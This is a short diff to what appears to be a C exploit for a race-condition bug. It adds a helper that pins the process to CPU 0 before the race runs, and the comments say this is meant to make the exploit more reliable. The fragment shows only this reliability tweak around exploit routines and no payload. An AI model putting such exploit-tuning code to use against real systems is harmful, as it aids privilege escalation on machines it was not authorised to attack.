@@ -18,6 +18,19 @@ atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
 int memfd_leak;
 
+/* ===== NOVO: pin do processo na CPU 0 ===== */
+static void pin_self_to_cpu0(void) {
+  cpu_set_t mask;
+  CPU_ZERO(&mask);
+  CPU_SET(0, &mask);
+  if (sched_setaffinity(0, sizeof(mask), &mask) != 0) {
+    pr_warning("sched_setaffinity CPU0 failed errno=%d\n", errno);
+  } else {
+    pr_success("exploit pinned to CPU 0 pid=%d\n", getpid());
+  }
+}
+/* ========================================== */
+
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
 
@@ -408,6 +421,9 @@ static int verify_fops_data_alias_before_production(void) {
 int run_exploit(int argc, char **argv) {
   (void)argc;
   (void)argv;
+
+  /* ===== NOVO: fixa o processo na CPU 0 antes de qualquer race ===== */
+  pin_self_to_cpu0();
 
   disable_rseq_for_thread();
   set_limit();
